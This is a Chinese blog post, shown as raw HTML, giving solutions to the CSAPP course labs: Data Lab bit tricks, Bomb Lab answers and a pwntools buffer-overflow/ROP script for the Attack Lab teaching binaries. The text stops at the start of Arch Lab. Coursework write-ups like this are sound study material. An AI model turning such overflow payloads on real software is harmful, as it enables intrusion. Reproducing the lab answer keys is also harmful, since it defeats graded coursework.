<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1"><title>CSAPP Lab | Focu$ on yourself.</title><meta name="description" content="CSAPP Lab WriteUp。"><meta name="author" content="0xfocu5"><meta name="copyright" content="0xfocu5"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta http-equiv="Cache-Control" content="no-transform"><meta http-equiv="Cache-Control" content="no-siteapp"><link rel="shortcut icon" href="https://focu5.oss-accelerate.aliyuncs.com/blog/20200927102719.jpg"><link rel="canonical" href="https://0xfocu5.github.io/posts/ab6e7b0/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><meta property="og:type" content="article"><meta property="og:title" content="CSAPP Lab"><meta property="og:url" content="https://0xfocu5.github.io/posts/ab6e7b0/"><meta property="og:site_name" content="Focu$ on yourself."><meta property="og:description" content="CSAPP Lab WriteUp。"><meta property="og:image" content="https://focu5.oss-accelerate.aliyuncs.com/blog/20200802074734.jpeg"><meta property="article:published_time" content="2020-07-31T16:00:00.000Z"><meta property="article:modified_time" content="2020-08-01T16:00:00.000Z"><meta name="twitter:card" content="summary"><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.css"><script>var GLOBAL_CONFIG = { 
  root: '/',
  hexoversion: '5.2.0',
  algolia: undefined,
  localSearch: {"path":"search.xml","languages":{"hits_empty":"找不到您查询的内容：${query}"}},
  translate: undefined,
  noticeOutdate: undefined,
  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true},
  copy: {
    success: 'Copy successfully',
    error: 'Copy error',
    noSupport: 'The browser does not support'
  },
  bookmark: {
    message_prev: 'Snackbar.bookmark.message_prev',
    message_next: 'Snackbar.bookmark.message_next'
  },
  runtime: 'days',
  date_suffix: {"one_hour":"date_suffix.one_hour","hours":"date_suffix.hours","day":"天前"},
  copyright: undefined,
  ClickShowText: undefined,
  medium_zoom: false,
  fancybox: true,
  Snackbar: undefined,
  justifiedGallery: {
    js: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/js/jquery.justifiedGallery.min.js',
    css: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/css/justifiedGallery.min.css'
  },
  baiduPush: false,
  isPhotoFigcaption: false,
  islazyload: true,
  isanchor: false
};

var saveToLocal = {
  set: function setWithExpiry(key, value, ttl) {
    const now = new Date()
    const expiryDay = ttl * 86400000
    const item = {
      value: value,
      expiry: now.getTime() + expiryDay,
    }
    localStorage.setItem(key, JSON.stringify(item))
    },

  get: function getWithExpiry(key) {
    const itemStr = localStorage.getItem(key)

    if (!itemStr) {
      return undefined
    }
    const item = JSON.parse(itemStr)
    const now = new Date()

    if (now.getTime() > item.expiry) {
      localStorage.removeItem(key)
      return undefined
    }
    return item.value
  }
}</script><script id="config_change">var GLOBAL_CONFIG_SITE = { 
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isSidebar: true,
  postUpdate: '2020-08-02 00:00:00'
}</script><noscript><style type="text/css">
#nav {
  opacity: 1
}
.justified-gallery img {
  opacity: 1
}
</style></noscript><script>var activateDarkMode = function () {
  document.documentElement.setAttribute('data-theme', 'dark')
  if (document.querySelector('meta[name="theme-color"]') !== null) {
    document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
  }
}
var activateLightMode = function () {
  document.documentElement.setAttribute('data-theme', 'light')
  if (document.querySelector('meta[name="theme-color"]') !== null) {
    document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
  }
}

var autoChangeMode = 'false'
var t = saveToLocal.get('theme')
if (autoChangeMode === '1') {
  var isDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches
  var isLightMode = window.matchMedia('(prefers-color-scheme: light)').matches
  var isNotSpecified = window.matchMedia('(prefers-color-scheme: no-preference)').matches
  var hasNoSupport = !isDarkMode && !isLightMode && !isNotSpecified

  if (t === undefined) {
    if (isLightMode) activateLightMode()
    else if (isDarkMode) activateDarkMode()
    else if (isNotSpecified || hasNoSupport) {
      var now = new Date()
      var hour = now.getHours()
      var isNight = hour <= 6 || hour >= 18
      isNight ? activateDarkMode() : activateLightMode()
    }
    window.matchMedia('(prefers-color-scheme: dark)').addListener(function (e) {
      if (saveToLocal.get('theme') === undefined) {
        e.matches ? activateDarkMode() : activateLightMode()
      }
    })
  } else if (t === 'light') activateLightMode()
  else activateDarkMode()
} else if (autoChangeMode === '2') {
  now = new Date()
  hour = now.getHours()
  isNight = hour <= 6 || hour >= 18
  if (t === undefined) isNight ? activateDarkMode() : activateLightMode()
  else if (t === 'light') activateLightMode()
  else activateDarkMode()
} else {
  if (t === 'dark') activateDarkMode()
  else if (t === 'light') activateLightMode()
}</script><meta name="generator" content="Hexo 5.2.0"></head><body><div id="mobile-sidebar"><div id="menu_mask"></div><div id="mobile-sidebar-menus"><div class="mobile_author_icon"><img class="avatar-img" data-lazy-src="https://focu5.oss-cn-beijing.aliyuncs.com/img/20200714224051.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="mobile_post_data"><div class="mobile_data_item is-center"><div class="mobile_data_link"><a href="/archives/"><div class="headline">Articles</div><div class="length_num">21</div></a></div></div><div class="mobile_data_item is-center">      <div class="mobile_data_link"><a href="/tags/"><div class="headline">Tags</div><div class="length_num">12</div></a></div></div><div class="mobile_data_item is-center">     <div class="mobile_data_link"><a href="/categories/"><div class="headline">Categories</div><div class="length_num">16</div></a></div></div></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tages</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Links</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div></div></div><div id="body-wrap"><div id="sidebar"><i class="fas fa-arrow-right on" id="toggle-sidebar"></i><div class="sidebar-toc"><div class="sidebar-toc__title">Catalog</div><div class="sidebar-toc__progress"><span class="progress-notice">You've read</span><span class="progress-num">0</span><span class="progress-percentage">%</span><div class="sidebar-toc__progress-bar">     </div></div><div class="sidebar-toc__content"><ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Data-Lab"><span class="toc-number">2.</span> <span class="toc-text">Data Lab</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#bitXor"><span class="toc-number">2.1.</span> <span class="toc-text">bitXor</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#tmin"><span class="toc-number">2.2.</span> <span class="toc-text">tmin</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#isTmax"><span class="toc-number">2.3.</span> <span class="toc-text">isTmax</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#allOddBits"><span class="toc-number">2.4.</span> <span class="toc-text">allOddBits</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#negate"><span class="toc-number">2.5.</span> <span class="toc-text">negate</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#isAsciiDigit"><span class="toc-number">2.6.</span> <span class="toc-text">isAsciiDigit</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#conditional"><span class="toc-number">2.7.</span> <span class="toc-text">conditional</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#isLessOrEqual"><span class="toc-number">2.8.</span> <span class="toc-text">isLessOrEqual</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#logicalNeg"><span class="toc-number">2.9.</span> <span class="toc-text">logicalNeg</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#howManyBits"><span class="toc-number">2.10.</span> <span class="toc-text">howManyBits</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Bomb-Lab"><span class="toc-number">3.</span> <span class="toc-text">Bomb Lab</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Attack-Lab"><span class="toc-number">4.</span> <span class="toc-text">Attack Lab</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Arch-Lab"><span class="toc-number">5.</span> <span class="toc-text">Arch Lab</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Part-A"><span class="toc-number">5.1.</span> <span class="toc-text">Part A</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#PartB"><span class="toc-number">5.2.</span> <span class="toc-text">PartB</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Cache-Lab"><span class="toc-number">6.</span> <span class="toc-text">Cache Lab</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Part-A-1"><span class="toc-number">6.1.</span> <span class="toc-text">Part A</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Part-B"><span class="toc-number">6.2.</span> <span class="toc-text">Part B</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Shell-Lab"><span class="toc-number">7.</span> <span class="toc-text">Shell Lab</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Malloc-Lab"><span class="toc-number">8.</span> <span class="toc-text">Malloc Lab</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Proxy-Lab"><span class="toc-number">9.</span> <span class="toc-text">Proxy Lab</span></a></li></ol></div></div></div><header class="post-bg" id="page-header" style="background-image: url(https://focu5.oss-accelerate.aliyuncs.com/blog/20200802074734.jpeg)"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">Focu$ on yourself.</a></span><span id="menus"><div id="search_button"><a class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> Search</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tages</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Links</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div><span class="close" id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></span></span></nav><div id="post-info"><div id="post-title"><div class="posttitle">CSAPP Lab</div></div><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2020-07-31T16:00:00.000Z" title="发表于 2020-08-01 00:00:00">2020-08-01</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2020-08-01T16:00:00.000Z" title="更新于 2020-08-02 00:00:00">2020-08-02</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/Notes/">Notes</a></span></div><div class="meta-secondline"> </div></div></div></header><main class="layout_post" id="content-inner"><article id="post"><div class="post-content" id="article-container"><h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>记录一下 css app lab，<a target="_blank" rel="noopener" href="http://csapp.cs.cmu.edu/3e/labs.html">下载地址</a></p>
<p>代码放在了 <a target="_blank" rel="noopener" href="https://github.com/focu5/CSAPP-Labs">Github</a></p>
<h3 id="Data-Lab"><a href="#Data-Lab" class="headerlink" title="Data Lab"></a>Data Lab</h3><h4 id="bitXor"><a href="#bitXor" class="headerlink" title="bitXor"></a>bitXor</h4><p><code>x ^ y = (~x &amp; y) | (x &amp; ~y) </code></p>
<p>题目限制我们仅使用 <code>&amp; ～</code>，所以我们想办法代替 <code>｜</code> 即可。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">bitXor</span><span class="params">(<span class="keyword">int</span> x, <span class="keyword">int</span> y)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> ~(~(~x &amp; y) &amp; (~(x &amp; ~y)));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="tmin"><a href="#tmin" class="headerlink" title="tmin"></a>tmin</h4><p>以补码形式返回最小的整数。即：符号为是1，其余均为0。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">tmin</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0x1</span>&lt;&lt;<span class="number">31</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="isTmax"><a href="#isTmax" class="headerlink" title="isTmax"></a>isTmax</h4><p>如果是最大的整数则返回1.</p>
<p>注意三个比较讨厌的数：</p>
<blockquote>
<p>0x7fffffff：01111111111111111111111111111111<br>0xffffffff：11111111111111111111111111111111<br>0x80000000：10000000000000000000000000000000</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">isTmax</span><span class="params">(<span class="keyword">int</span> x)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> !((~x^(x+<span class="number">1</span>)) | !(x+<span class="number">1</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="allOddBits"><a href="#allOddBits" class="headerlink" title="allOddBits"></a>allOddBits</h4><p>判断所有奇数位是否都为1.</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">allOddBits</span><span class="params">(<span class="keyword">int</span> x)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">int</span> y = <span class="number">0xaa</span> + (<span class="number">0xaa</span>&lt;&lt;<span class="number">8</span>);</span><br><span class="line">  y = y+ (y &lt;&lt; <span class="number">16</span>);</span><br><span class="line">  <span class="keyword">return</span> !((y &amp; x) ^ y);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>思路：可以先自行构造出一个所有奇数位都为1的标准数，在进行比较。</p>
<h4 id="negate"><a href="#negate" class="headerlink" title="negate"></a>negate</h4><p>返回相反数，常识题。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">negate</span><span class="params">(<span class="keyword">int</span> x)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> ~x+<span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="isAsciiDigit"><a href="#isAsciiDigit" class="headerlink" title="isAsciiDigit"></a>isAsciiDigit</h4><p>计算输入值是否是数字 0-9 的 <code>ASCII</code> 值。</p>
<p>思路：先观察0x30-0x39的二进制数有什么特点，发现0x30-0x3f之间的第4、5位均为1。假设 x 是 0 - 9 之间的一个数，！(x &lt;&lt; 4 ^ 0x3) = 1，y = x + 0x6， ！(y &lt;&lt; 4 ^ 0x3) = 1，确保这两个同时成立即可判断。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">isAsciiDigit</span><span class="params">(<span class="keyword">int</span> x)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">int</span> y = x &gt;&gt; <span class="number">4</span>;</span><br><span class="line">  x = x + <span class="number">0x6</span>;</span><br><span class="line">  <span class="keyword">int</span> z = x &gt;&gt; <span class="number">4</span>;</span><br><span class="line">  <span class="keyword">return</span> !(y ^ <span class="number">0x3</span>) &amp; !(z ^ <span class="number">0x3</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="conditional"><a href="#conditional" class="headerlink" title="conditional"></a>conditional</h4><p>执行运算符 x ? y : z：当 x 不为 0 时，返回 y；否则返回 z。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">conditional</span><span class="params">(<span class="keyword">int</span> x, <span class="keyword">int</span> y, <span class="keyword">int</span> z)</span> </span>&#123;</span><br><span class="line">  x = !x + ~<span class="number">0</span>;</span><br><span class="line">  <span class="keyword">return</span> (y &amp; x) | (z &amp; ~x);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="isLessOrEqual"><a href="#isLessOrEqual" class="headerlink" title="isLessOrEqual"></a>isLessOrEqual</h4><p>判断 x &lt;= y</p>
<p><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/59534845">参考</a></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">isLessOrEqual</span><span class="params">(<span class="keyword">int</span> x, <span class="keyword">int</span> y)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">int</span> negX=~x+<span class="number">1</span>;</span><br><span class="line">  <span class="keyword">int</span> addX=negX+y;</span><br><span class="line">  <span class="keyword">int</span> checkSign = addX&gt;&gt;<span class="number">31</span>&amp;<span class="number">1</span>;</span><br><span class="line">  <span class="keyword">int</span> leftBit = <span class="number">1</span>&lt;&lt;<span class="number">31</span>;</span><br><span class="line">  <span class="keyword">int</span> xLeft = x&amp;leftBit;</span><br><span class="line">  <span class="keyword">int</span> yLeft = y&amp;leftBit;</span><br><span class="line">  <span class="keyword">int</span> bitXor = xLeft ^ yLeft;</span><br><span class="line">  bitXor = (bitXor&gt;&gt;<span class="number">31</span>)&amp;<span class="number">1</span>;</span><br><span class="line">  <span class="keyword">return</span> ((!bitXor)&amp;(!checkSign))|(bitXor&amp;(xLeft&gt;&gt;<span class="number">31</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="logicalNeg"><a href="#logicalNeg" class="headerlink" title="logicalNeg"></a>logicalNeg</h4><p>实现<code> ！</code>运算</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">logicalNeg</span><span class="params">(<span class="keyword">int</span> x)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> ((x|(~x+<span class="number">1</span>))&gt;&gt;<span class="number">31</span>)+<span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="howManyBits"><a href="#howManyBits" class="headerlink" title="howManyBits"></a>howManyBits</h4><p>用二分法来判断。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">howManyBits</span><span class="params">(<span class="keyword">int</span> x)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">int</span> b16,b8,b4,b2,b1,b0;</span><br><span class="line">  <span class="keyword">int</span> sign=x&gt;&gt;<span class="number">31</span>;</span><br><span class="line">  x = (sign&amp;~x)|(~sign&amp;x);</span><br><span class="line">  b16 = !!(x&gt;&gt;<span class="number">16</span>)&lt;&lt;<span class="number">4</span>;</span><br><span class="line">  x = x&gt;&gt;b16;<span class="comment">//如果有（至少需要16位），则将原数右移16位</span></span><br><span class="line">  b8 = !!(x&gt;&gt;<span class="number">8</span>)&lt;&lt;<span class="number">3</span>;<span class="comment">//剩余位高8位是否有1</span></span><br><span class="line">  x = x&gt;&gt;b8;<span class="comment">//如果有（至少需要16+8=24位），则右移8位</span></span><br><span class="line">  b4 = !!(x&gt;&gt;<span class="number">4</span>)&lt;&lt;<span class="number">2</span>;<span class="comment">//同理</span></span><br><span class="line">  x = x&gt;&gt;b4;</span><br><span class="line">  b2 = !!(x&gt;&gt;<span class="number">2</span>)&lt;&lt;<span class="number">1</span>;</span><br><span class="line">  x = x&gt;&gt;b2;</span><br><span class="line">  b1 = !!(x&gt;&gt;<span class="number">1</span>);</span><br><span class="line">  x = x&gt;&gt;b1;</span><br><span class="line">  b0 = x;</span><br><span class="line">  <span class="keyword">return</span> b16+b8+b4+b2+b1+b0+<span class="number">1</span>;<span class="comment">//+1表示加上符号位</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="Bomb-Lab"><a href="#Bomb-Lab" class="headerlink" title="Bomb Lab"></a>Bomb Lab</h3><p>其实有re、pwn基础，拆解还不算很困难。（还可以结合<code>ida</code>分析，不过个人感觉怼汇编理解会更好一些.</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&quot;./bomb&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">db</span>():</span></span><br><span class="line">	gdb.attach(p)</span><br><span class="line"><span class="comment">#phase_1</span></span><br><span class="line">p.sendline(<span class="string">&quot;Border relations with Canada have never been better.&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#phase_2</span></span><br><span class="line">p.sendline(<span class="string">&quot;1 2 4 8 16 32&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#phase_3</span></span><br><span class="line">p.sendline(<span class="string">&quot;1 311&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#phase_3</span></span><br><span class="line">p.sendline(<span class="string">&quot;7 0&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#phase_4</span></span><br><span class="line">p.sendline(<span class="string">&quot;YONUFG&quot;</span>)</span><br><span class="line"><span class="comment">#db()</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#phase_5</span></span><br><span class="line">p.sendline(<span class="string">&quot;4 3 2 1 6 5&quot;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h3 id="Attack-Lab"><a href="#Attack-Lab" class="headerlink" title="Attack Lab"></a>Attack Lab</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line"></span><br><span class="line">argv1 = sys.argv[<span class="number">1</span>]</span><br><span class="line">argv2 = sys.argv[<span class="number">2</span>]</span><br><span class="line"><span class="keyword">if</span> argv1 == <span class="string">&quot;part1&quot;</span> :</span><br><span class="line">	p = process(argv=[<span class="string">&#x27;./ctarget&#x27;</span>, <span class="string">&quot;-q&quot;</span>])</span><br><span class="line"><span class="keyword">elif</span> argv1 == <span class="string">&quot;part2&quot;</span>:</span><br><span class="line">	p = process(argv=[<span class="string">&#x27;./rtarget&#x27;</span>, <span class="string">&quot;-q&quot;</span>])</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">db</span>():</span></span><br><span class="line">	gdb.attach(p)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pwn1</span>():</span></span><br><span class="line">	<span class="comment">#ROPgadget --binary ctarget --only &quot;pop|ret&quot;</span></span><br><span class="line">	rdi_ret = <span class="number">0x000000000040141b</span></span><br><span class="line">	<span class="keyword">if</span> argv2 == <span class="string">&quot;level_1&quot;</span>:</span><br><span class="line">		p.sendline(<span class="string">&quot;a&quot;</span>*<span class="number">0x28</span>+p64(<span class="number">0x4017c0</span>))</span><br><span class="line"></span><br><span class="line">	<span class="keyword">elif</span> argv2 == <span class="string">&quot;level_2&quot;</span>:</span><br><span class="line">		rdi_ret = <span class="number">0x40141b</span></span><br><span class="line">		payload = <span class="string">&quot;a&quot;</span> *<span class="number">0x28</span> + p64(rdi_ret) + p64(<span class="number">0x59b997fa</span>) + p64(<span class="number">0x4017ec</span>)</span><br><span class="line">		p.sendline(payload)</span><br><span class="line"></span><br><span class="line">	<span class="keyword">elif</span> argv2 == <span class="string">&quot;level_3&quot;</span>:</span><br><span class="line">		payload = <span class="string">&quot;a&quot;</span> *<span class="number">0x28</span> + p64(rdi_ret) + p64(<span class="number">0x5561dcb8</span>) + p64(<span class="number">0x4018fa</span>) + <span class="string">&quot;0x59b997fa&quot;</span></span><br><span class="line">		p.sendline(payload)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pwn2</span>():</span></span><br><span class="line">	<span class="comment">#ROPgadget --binary rtarget --only &quot;pop|ret&quot;</span></span><br><span class="line">	rdi_ret = <span class="number">0x000000000040141b</span></span><br><span class="line">	<span class="keyword">if</span> argv2 == <span class="string">&quot;level_2&quot;</span>:</span><br><span class="line">		payload = <span class="string">&quot;a&quot;</span> *<span class="number">0x28</span> + p64(rdi_ret) + p64(<span class="number">0x59b997fa</span>) + p64(<span class="number">0x4017ec</span>) </span><br><span class="line">		p.sendline(payload)</span><br><span class="line">	<span class="keyword">elif</span> argv2 == <span class="string">&quot;level_3&quot;</span>:</span><br><span class="line">		read_plt = <span class="number">0x400D30</span></span><br><span class="line">		main_addr = <span class="number">0x4011AD</span></span><br><span class="line">		payload = <span class="string">&quot;a&quot;</span> * <span class="number">0x28</span> + p64(rdi_ret) + p64(<span class="number">0x6054E4</span>) + p64(<span class="number">0x4018fa</span>)</span><br><span class="line">		p.sendline(payload)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> argv1 == <span class="string">&quot;part1&quot;</span>:</span><br><span class="line">	pwn1()</span><br><span class="line"><span class="keyword">elif</span> argv1 == <span class="string">&quot;part2&quot;</span>:</span><br><span class="line">	pwn2()</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h3 id="Arch-Lab"><a href="#Arch-Lab" class="headerlink" title="Arch Lab"></a>Arch Lab</h3><blockquote>
<p>$ sudo apt-get install bison flex</p>
<p>$ cd Arch_lab</p>
<p>$ tar xvf  sim.tar</p>
<p>$ cd sim; make clean; make</p>
